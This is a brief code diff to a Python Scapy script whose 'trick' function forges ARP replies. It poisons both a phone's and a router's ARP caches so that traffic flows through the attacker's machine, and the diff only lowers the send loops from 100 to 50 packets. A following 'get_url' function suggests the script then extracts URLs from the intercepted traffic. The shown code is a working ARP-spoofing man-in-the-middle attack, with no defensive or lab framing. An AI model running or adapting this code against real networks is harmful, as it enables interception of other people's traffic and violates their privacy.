@@ -41,13 +41,13 @@ def trick():
 	pk = Ether(src=Config["my_mac"], dst=Config["phone_mac"]) / ARP(hwsrc=Config["my_mac"], 
 	psrc=Config["gate_ip"], hwdst=Config["phone_mac"], pdst=Config["phone_ip"], op=2)
 
-	for i in range(100):
+	for i in range(50):
 		sendp(pk, iface=argv["interface"])
 
 	pk_to_router = Ether(src=Config["my_mac"], dst=Config["gate_mac"]) / ARP(hwsrc=Config["my_mac"], 
 		psrc=Config["phone_ip"], hwdst=Config["gate_mac"], pdst=Config["gate_ip"], op=2)
 
-	for i in range(100):
+	for i in range(50):
 		sendp(pk_to_router, iface=argv["interface"])
 
 def get_url(raw):
